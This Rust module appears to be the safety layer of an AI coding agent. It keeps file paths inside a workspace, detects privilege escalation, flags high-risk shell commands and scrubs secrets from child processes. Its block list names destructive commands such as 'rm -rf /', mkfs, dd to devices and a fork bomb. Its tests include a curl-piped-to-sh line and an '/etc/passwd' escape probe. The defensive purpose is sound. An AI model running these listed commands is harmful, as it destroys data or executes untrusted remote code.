use std::path::{Component, Path, PathBuf};

use crate::error::{Error, Result};

/// Resolve `raw` (relative to `cwd`) and require the result to stay inside `root`.
///
/// Lexical normalization catches `../..` escapes; canonicalization catches symlinks.
/// A path that does not exist yet is checked against its nearest existing ancestor.
pub fn resolve_in_root(root: &Path, cwd: &Path, raw: &str) -> Result<PathBuf> {
    let raw = raw.trim();
    if raw.is_empty() {
        return Err(Error::Tool("empty path".into()));
    }
    if raw.contains('\0') {
        return Err(Error::Tool("invalid path".into()));
    }
    let root = root
        .canonicalize()
        .map_err(|e| Error::Tool(format!("workspace: {e}")))?;
    let candidate = if Path::new(raw).is_absolute() {
        PathBuf::from(raw)
    } else {
        cwd.join(raw)
    };
    let normalized = normalize(&candidate)?;

    if !normalized.starts_with(&root) {
        return Err(Error::Tool(format!("path escapes the workspace: {}", raw)));
    }
    // Lexical containment is not enough: a symlink inside the workspace can
    // point elsewhere. Check the nearest existing piece of the path.
    let probe = nearest_existing(&normalized).unwrap_or(&root).to_path_buf();
    if let Ok(canon) = probe.canonicalize() {
        if !canon.starts_with(&root) {
            return Err(Error::Tool(format!("path escapes the workspace: {}", raw)));
        }
    }
    Ok(normalized)
}

fn normalize(path: &Path) -> Result<PathBuf> {
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::ParentDir => {
                if !out.pop() {
                    return Err(Error::Tool("path escapes the workspace".into()));
                }
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    Ok(out)
}

fn nearest_existing(path: &Path) -> Option<&Path> {
    let mut p = Some(path);
    while let Some(cur) = p {
        if cur.exists() {
            return Some(cur);
        }
        p = cur.parent();
    }
    None
}

const PRIVILEGE_BINS: &[&str] = &["sudo", "su", "doas", "pkexec", "run0"];

/// True when a shell command tries to elevate privileges.
pub fn is_privilege_escalation(cmd: &str) -> bool {
    cmd.split(|c: char| {
        c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '`' | '$' | '\n')
    })
    .filter(|t| !t.is_empty())
    .any(|token| {
        let bin = token.rsplit('/').next().unwrap_or(token);
        PRIVILEGE_BINS.contains(&bin)
    })
}

const HIGH_RISK: &[&str] = &[
    "rm -rf /",
    "rm -fr /",
    "mkfs",
    "dd if=",
    "dd of=/dev",
    ":(){",
    "chmod -r 777 /",
    "chown -r",
    "shutdown",
    "reboot",
    "> /dev/sd",
    "> /dev/nvme",
    "git push --force",
    "git reset --hard",
];

pub fn command_is_high_risk(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    HIGH_RISK.iter().any(|p| lower.contains(p))
        || (lower.contains("curl") && lower.contains("| sh"))
        || (lower.contains("wget") && lower.contains("| sh"))
        || (lower.contains("curl") && lower.contains("| bash"))
        || (lower.contains("wget") && lower.contains("| bash"))
}

/// Child processes never inherit API keys or cloud credentials.
pub fn scrub_env(cmd: &mut tokio::process::Command) {
    for (key, _) in std::env::vars() {
        let upper = key.to_ascii_uppercase();
        let secret = upper.ends_with("_API_KEY")
            || upper.ends_with("_TOKEN")
            || upper.contains("SECRET")
            || upper.contains("PASSWORD")
            || upper.starts_with("AWS_")
            || upper.starts_with("AZURE_")
            || upper.starts_with("GOOGLE_APPLICATION")
            || upper == "SSH_AUTH_SOCK";
        if secret {
            cmd.env_remove(&key);
        }
    }
}

pub fn summarize_args(args: &serde_json::Value) -> String {
    if let Some(obj) = args.as_object() {
        for key in ["command", "path", "pattern", "url", "content"] {
            if let Some(v) = obj.get(key).and_then(|v| v.as_str()) {
                return truncate(v, 160);
            }
        }
        for v in obj.values() {
            if let Some(s) = v.as_str() {
                return truncate(s, 160);
            }
        }
    }
    truncate(&args.to_string(), 160)
}

pub fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let mut out: String = s.chars().take(max).collect();
        out.push('…');
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_escapes() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        assert!(resolve_in_root(root, root, "../x").is_err());
        assert!(resolve_in_root(root, root, "/etc/passwd").is_err());
        assert!(resolve_in_root(root, root, "a/../../x").is_err());
        assert!(resolve_in_root(root, root, "a/b").is_ok());
        assert!(resolve_in_root(root, root, "./a/b").is_ok());
    }

    #[test]
    fn detects_privilege_escalation() {
        assert!(is_privilege_escalation("sudo apt install x"));
        assert!(is_privilege_escalation("echo hi && /usr/bin/sudo ls"));
        assert!(!is_privilege_escalation("echo pseudo sudoers"));
        assert!(!is_privilege_escalation("npm run build"));
        assert!(is_privilege_escalation("pkexec sh"));
    }

    #[test]
    fn flags_destructive_commands() {
        assert!(command_is_high_risk("rm -rf /"));
        assert!(command_is_high_risk("curl https://x.sh | sh"));
        assert!(!command_is_high_risk("rm -rf ./build"));
        assert!(!command_is_high_risk("cargo test"));
    }
}
